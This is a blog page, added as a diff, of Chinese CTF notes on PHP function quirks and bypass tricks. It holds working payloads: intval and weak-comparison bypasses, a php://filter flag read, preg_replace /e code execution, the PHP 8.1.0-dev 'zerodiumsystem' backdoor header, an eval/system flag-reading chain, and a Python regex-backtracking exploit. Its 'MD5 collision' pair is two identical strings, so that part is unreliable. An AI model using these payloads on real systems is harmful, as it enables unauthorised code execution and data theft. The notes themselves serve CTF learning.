@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="php特性[TOC] 一、函数【CTFWP】ctfshow-web40_ctfshow web40-CSDN博客 ctfshow-web-命令执行（web29-77、web118-124） - bingbingge - 博客园 intval函数**1.**通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 1intval(mixed $value(要转换成">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/03/18/php%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="php特性[TOC] 一、函数【CTFWP】ctfshow-web40_ctfshow web40-CSDN博客 ctfshow-web-命令执行（web29-77、web118-124） - bingbingge - 博客园 intval函数**1.**通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 1intval(mixed $value(要转换成">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-18T12:47:21.050Z">
+<meta property="article:modified_time" content="2025-10-16T13:24:37.474Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-php特性" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/03/18/php%E7%89%B9%E6%80%A7/" class="article-date">
+  	<time datetime="2025-03-18T12:47:21.050Z" itemprop="datePublished">2025-03-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><p>[TOC]</p>
+<h2 id="一、函数"><a href="#一、函数" class="headerlink" title="一、函数"></a>一、函数</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LongL_GuYu/article/details/140787997">【CTFWP】ctfshow-web40_ctfshow web40-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/knight-errant-dr/p/16377935.html">ctfshow-web-命令执行（web29-77、web118-124） - bingbingge - 博客园</a></p>
+<h4 id="intval函数"><a href="#intval函数" class="headerlink" title="intval函数"></a>intval函数</h4><p>**1.**通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intval(mixed $value(要转换成integer的数量值), int $base(转化所使用的进制) = 10)</span><br></pre></td></tr></table></figure>
+
+<p>**2.**特性：输入的值如果是字符串，它返回的内容取决于第一个字符左侧的数字。如 intval(‘11a22’)&#x3D;11。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> include(&quot;flag.php&quot;);</span><br><span class="line"> highlight_file(__FILE__);</span><br><span class="line"> if(isset($_GET[&#x27;sqctf&#x27;]))&#123;</span><br><span class="line"> $num = $_GET[&#x27;sqctf&#x27;];</span><br><span class="line"> if($num==114514)&#123;</span><br><span class="line">die(&quot;逸一时, 误一世!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> if(intval($num,0)==114514)&#123;</span><br><span class="line"> echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line"> echo &quot;看看你输入的数字: &quot;.intval($num,0);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>要求输入的数不能为114514，但要求经过intval函数转换后等于114514，可传入八进制或小 数形式绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?sqctf=0337522</span><br><span class="line">/?sqctf=114514.1</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.</strong> intval() 转换数组类型时，不关心数组中的内容，只判断数组中有没有元素。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">「空数组」返回 0</span><br><span class="line">「非空数组」返回 1</span><br></pre></td></tr></table></figure>
+
+<p><strong>实例</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(intval(array()));</span><br><span class="line">var_dump(intval(array(3,2)));</span><br></pre></td></tr></table></figure>
+
+<p><strong>输出</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int(0)</span><br><span class="line">int(1)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="strpos-函数"><a href="#strpos-函数" class="headerlink" title="strpos()函数"></a>strpos()函数</h4><p>用于查找一个字符串在另一个字符串中首次出现的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int|false strpos ( string $haystack(要在其中查找 $needle 的字符串), mixed $needle(要查找的字符串) [, int $offset(可选参数，指定从 $haystack 的哪个位置开始查找，默认为 0。) = 0 ] )</span><br></pre></td></tr></table></figure>
+
+<p>(字符的索引值从0开始)</p>
+<h4 id="in-array-函数"><a href="#in-array-函数" class="headerlink" title="in_array()函数"></a>in_array()函数</h4><p>in_array() 函数搜索数组中是否存在指定的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bool in_array ( mixed $needle(规定要在数组搜索的值。) , array $haystack(规定要搜索的数组) [, bool $strict(如果该参数设置为 TRUE，则 in_array() 函数检查搜索的数据与数组的值的类型是否相同。) = FALSE ] )</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="array-push-函数"><a href="#array-push-函数" class="headerlink" title="array_push()函数"></a>array_push()函数</h4><p>array_push() 函数向第一个参数的数组尾部添加一个或多个元素（入栈），然后返回新数组的长度</p>
+<h4 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h4><p>一个反射类，功能十分强大，内置了各种获取类信息的方法，创建方式为new ReflectionClass(‘classname’)打印类的信息</p>
+<h4 id="ReflectionObject"><a href="#ReflectionObject" class="headerlink" title="ReflectionObject"></a>ReflectionObject</h4><p>另一个反射类，创建方式为new ReflectionObject(对象名)</p>
+<h4 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h4><p>substr() 函数返回字符串的一部分。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(string(规定要返回其中一部分的字符串。),start(规定),length(规定被返回字符串的长度。默认是直到字符串的结尾。))</span><br></pre></td></tr></table></figure>
+
+<h4 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h4><p>sha1函数和MD5都是哈希编码中的一种，都存在可以绕过的漏洞，比如说数组绕过</p>
+<h4 id="foreach"><a href="#foreach" class="headerlink" title="foreach()"></a>foreach()</h4><p><code>foreach</code> 语法结构提供了遍历数组的简单方式。<code>foreach</code> 仅能够应用于数组和对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foreach (iterable_expression as $value)</span><br><span class="line">    statement</span><br><span class="line">foreach (iterable_expression as $key =&gt; $value)</span><br><span class="line">    statement</span><br></pre></td></tr></table></figure>
+
+<h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str(string(规定要解析的字符串。),array(规定存储变量的数组名称。该参数指示变量存储到数组中。))</span><br></pre></td></tr></table></figure>
+
+<p>**1.**如果未设置 array 参数，由该函数设置的变量将覆盖已存在的同名变量。</p>
+<p>**2.**php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p>
+<h4 id="ereg-函数"><a href="#ereg-函数" class="headerlink" title="ereg()函数"></a>ereg()函数</h4><p>ereg()函数在字符串中搜索由模式指定的字符串，如果找到模式，则返回true，否则返回false。在搜索时，对于字母字符，要区分大小写。</p>
+<p><strong>ereg函数存在NULL截断漏洞</strong></p>
+<h4 id="strrev-函数"><a href="#strrev-函数" class="headerlink" title="strrev(函数"></a>strrev(函数</h4><p>strrev() 函数反转字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strrev(string)</span><br></pre></td></tr></table></figure>
+
+<h4 id="stripos-函数"><a href="#stripos-函数" class="headerlink" title="stripos()函数"></a>stripos()函数</h4><p>stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p>
+<h4 id="fgets-函数"><a href="#fgets-函数" class="headerlink" title="fgets()函数"></a>fgets()函数</h4><p>fgets() 函数会在到达指定长度( length - 1 )、碰到换行符、读到文件末尾（EOF）时（以先到者为准），停止返回一个新行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fgets(file(规定要读取的文件。),length(可选。规定要读取的字节数。默认是 1024 字节。))</span><br></pre></td></tr></table></figure>
+
+<h4 id="ctype-alpha-函数"><a href="#ctype-alpha-函数" class="headerlink" title="ctype_alpha()函数"></a>ctype_alpha()函数</h4><p>做纯字符检测。——如果在当前语言环境中 <code>text</code> 里的每个字符都是一个字母，那么就返回**<code>true</code><strong>，反之则返回</strong><code>false</code>**。</p>
+<h4 id="file-get-contents-函数"><a href="#file-get-contents-函数" class="headerlink" title="file_get_contents()函数"></a>file_get_contents()函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(file_get_contents($cxk)==&quot;ctrl&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>file_get_contents($cxk)</code> 函数读取 <code>$cxk</code> 变量中指定的 URL 的文件，因为是弱比较<br>可以使用 php 伪协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,ctrl</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="highlight-file-函数"><a href="#highlight-file-函数" class="headerlink" title="highlight_file()函数"></a>highlight_file()函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challenge.basectf.fun:42951/?Jail[by.Happy=highlight_file(&quot;hint.html&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>highlight_file()通过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=glob&spm=1001.2101.3001.7020">glob</a>()函数模糊匹配。highlight_file()支持绝对路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.basectf.fun:42951/?Jail[by.Happy=highlight_file(glob(&quot;/fl*&quot;)[0]);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="glob-函数"><a href="#glob-函数" class="headerlink" title="glob()函数"></a>glob()函数</h4><p>返回一个包含匹配指定模式的文件名或目录的<strong>数组</strong>，如果失败则返回 FALSE。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">print_r(glob(&quot;*.txt&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h4><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br></pre></td></tr></table></figure>
+
+<p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以 <code>replacement</code> 进行替换。</p>
+<p><strong>反向引用</strong> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br></pre></td></tr></table></figure>
+
+<p>说人话就是，\谁，就匹配第几个</p>
+<h5 id="eg"><a href="#eg" class="headerlink" title="eg."></a>eg.</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、/g 表示该表达式将用来在输入字符串中查找所有可能的匹配，返回的结果可以是多个。如果不加/g最多只会匹配一个</span><br><span class="line">2、/i 表示匹配的时候不区分大小写，这个跟其它语言的正则用法相同</span><br><span class="line">3、/m 表示多行匹配。什么是多行匹配呢？就是匹配换行符两端的潜在匹配。影响正则中的^$符号</span><br><span class="line">4、/s 与/m相对，单行模式匹配。</span><br><span class="line">5、/e 可执行模式，此为PHP专有参数，例如preg_replace函数。</span><br><span class="line">6、/x 忽略空白模式。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;? </span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;); </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>如果我们提交?h&#x3D;phpinfo()，phpinfo()将会被执行（使用&#x2F;e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 </p>
+<p>那如果这样呢</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &#x27;test(&quot;\1&quot;)&#x27;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>提交 ?h&#x3D;[php]phpinfo()[&#x2F;php]，phpinfo()会被执行吗？<br>肯定不会。因为经过正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了。<br>有没有办法让它执行呢?</p>
+<p><strong>有</strong> </p>
+<p>在这里我们如果提交?h&#x3D;[php]{${phpinfo()}}[&#x2F;php]，phpinfo()就会被执行。为什么呢？<br>在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。<br>注意：双引号中的函数不会被执行和替换。</p>
+<p>那这有没有办法防御呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将&#x27;test(&quot;\1&quot;)&#x27; 修改为&quot;test(&#x27;\1&#x27;)&quot;，这样‘$&#123;phpinfo()&#125;&#x27;就会被当做一个普通的字符串处理（单引号中的变量不会被处理）。</span><br></pre></td></tr></table></figure>
+
+<p><strong>总结</strong> </p>
+<p>preg_replace \e 模式如果 replacement中是双引号的，那有此漏洞</p>
+<h4 id="get-函数"><a href="#get-函数" class="headerlink" title="_get()函数"></a>_get()函数</h4><p>__get()方法的作用是获取私有成员的属性值，它含有一个参数，即要获取的成员属性的名称，调用时返回获取的属性值，这个方法不需要手动调用</p>
+<h4 id="implode-函数"><a href="#implode-函数" class="headerlink" title="implode()函数"></a>implode()函数</h4><p><code>implode()</code>函数的基本作用是将一个数组中的所有元素连接为一个字符串。它接受两个参数：第一个参数是用于连接数组元素的字符串（分隔符），第二个参数是需要连接的数组。函数返回的结果是一个由分隔符连接的字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$array = array(&#x27;apple&#x27;, &#x27;orange&#x27;, &#x27;banana&#x27;);</span><br><span class="line">$result = implode(&#x27;, &#x27;, $array);</span><br><span class="line">echo $result; // 输出: apple, orange, banana</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>implode()</code>函数使用逗号和空格作为分隔符，将数组<code>$array</code>中的元素连接成一个字符串。</p>
+<h2 id="二、特性"><a href="#二、特性" class="headerlink" title="二、特性"></a>二、特性</h2><p>**1.**字符 ^ 和 $ 同时使用时，表示精确匹配</p>
+<p>需要匹配到以php开头和以php结尾的字符串才会返回true，否则返回false</p>
+<p><strong>2.</strong>&#x2F;m 多行匹配模式下，若存在换行\n并且有开始^或结束$符的情况下，将以换行为分隔符，逐行进行匹配。</p>
+<p>但是当不是多行匹配模式的时候，出现换行符 <code>%0a</code>的时，$cmd的值会被当做两行处理。</p>
+<p>**3.**弱比较&#x3D;&#x3D;</p>
+<p>由于是弱比较，所以可以通过加字符来绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?u=./flag.php or ?u=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>4.</strong></p>
+<p><strong>php短开标签</strong></p>
+<?=(表达式)?><p>等价于<?php echo (表达式)?></p>
+<h5 id="5-解析"><a href="#5-解析" class="headerlink" title="5.解析"></a>5.解析</h5><p>在php中变量名只有数字字母下划线，被get或者post传入的变量名，如果含有 空格 、 + 、[ 则会被转化为 _ ,但php中有个特性就是如果传入 [ ，它被转化为 _ 之后，后面的字符就会被保留下来不会被替换。</p>
+<p>get请求与点：</p>
+<p>当 php 版本⼩于 8 时，[GET 请求](<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=GET">https://so.csdn.net/so/search?q=GET</a> 请求&amp;spm&#x3D;1001.2101.3001.7020)的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这</p>
+<p>个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。</p>
+<h5 id="6-MD5"><a href="#6-MD5" class="headerlink" title="6.MD5"></a>6.MD5</h5><p>QNKCDZO 的MD5是 0e830400451993494058024219903391</p>
+<p>240610708 的MD5是 0e462097431906509019562988736854</p>
+<p>在松散比较中，0e… 会被视为0，所以 0e… &#x3D;&#x3D; 0e… 为真。</p>
+<p>所以对于第一个关卡，我可以使用 a&#x3D;QNKCDZO 和 b&#x3D;240610708。</p>
+<p>但代码中 $a 和 $b 是通过 POST 传递的，所以我需要以POST方式发送这些值。</p>
+<p><strong>使用严格比较 <code>md5((string)$a) === md5((string)$b)</code></strong></p>
+<p><strong>例如，我可以使用来自MD5碰撞的字符串。一个常见的是：</strong></p>
+<p>字符串1：<code>d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70</code></p>
+<p>字符串2：<code>d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70</code></p>
+<p>另一个方法是使用数组。在PHP中，如果传递数组给md5函数，它会返回NULL，并且如果两个都是数组，md5($a)和md5($b)都是NULL，在严格比较下NULL &#x3D;&#x3D;&#x3D; NULL为真，但数组本身不同。</p>
+<p><strong>例如，<code>aa[]=1</code> 和 <code>bb[]=2</code>，那么 <code>$a</code> 是数组 [1]，<code>$b</code> 是数组 [2]，它们不同，但转换为字符串后都是 “Array”，md5相同。</strong></p>
+<h2 id="三、正则溯源绕过"><a href="#三、正则溯源绕过" class="headerlink" title="三、正则溯源绕过"></a>三、正则溯源绕过</h2><h3 id="什么是正则溯源绕过"><a href="#什么是正则溯源绕过" class="headerlink" title="什么是正则溯源绕过"></a>什么是正则溯源绕过</h3><ul>
+<li><p>从问题的某一种状态（初始状态）出发，搜索从这种状态出发所能达到的所有“状态”，当一条路走到“尽头”的时候（不能再前进），再后退一步或若干步，从另一种可能“状态”出发，继续搜索，直到所有的“路径”（状态）都试探过。这种不断“前进”、不断“回溯”寻找解的方法，就称作“回溯法”。本质上就是深度优先搜索算法。其中退到之前的某一步这一过程，我们称为“回溯”。</p>
+<pre><code> ## 四、PHP 8.1.0-dev 后门远程命令执行漏洞
+</code></pre>
+</li>
+</ul>
+<p>后门为添加请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&#x27;id&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>注意t双写</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">?c=eval(next(reset(get_defined_vars())));&amp;1=;system(&quot;tac%20flag.php&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="最大回溯绕过"><a href="#最大回溯绕过" class="headerlink" title="最大回溯绕过"></a>最大回溯绕过</h3><p><strong>利用正则最大回溯绕过，看到<code>&#39;/.+?ISCTF/is&#39;</code>这种就要想到了，我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</strong> </p>
+<p><strong>eg.</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">require &#x27;flag.php&#x27;;</span><br><span class="line">$str = (String)$_POST[&#x27;pan_gu&#x27;];</span><br><span class="line">$num = $_GET[&#x27;zhurong&#x27;];</span><br><span class="line">$lida1 = $_GET[&#x27;hongmeng&#x27;];</span><br><span class="line">$lida2 = $_GET[&#x27;shennong&#x27;];</span><br><span class="line">if($lida1 !== $lida2 &amp;&amp; md5($lida1) === md5($lida2))&#123;</span><br><span class="line">    echo &quot;md5绕过了!&quot;;</span><br><span class="line">    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;</span><br><span class="line">        die(&#x27;你干嘛?哎哟!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    elseif(intval($num))&#123;</span><br><span class="line">        if(preg_match(&#x27;/.+?ISCTF/is&#x27;, $str))&#123;</span><br><span class="line">            die(&quot;再想想!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(stripos($str, &#x27;2023ISCTF&#x27;) === false)&#123;</span><br><span class="line">            die(&quot;就差一点点啦!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p><strong>exp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;url/?hongmeng[]=1&amp;shennong[]=2&amp;zhurong[]=1&quot;,data=&#123;&quot;pan_gu&quot;:&quot;-&quot;*1000000+&quot;2023ISCTF&quot;&#125;)</span><br><span class="line">print(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/03/20/web/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/03/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
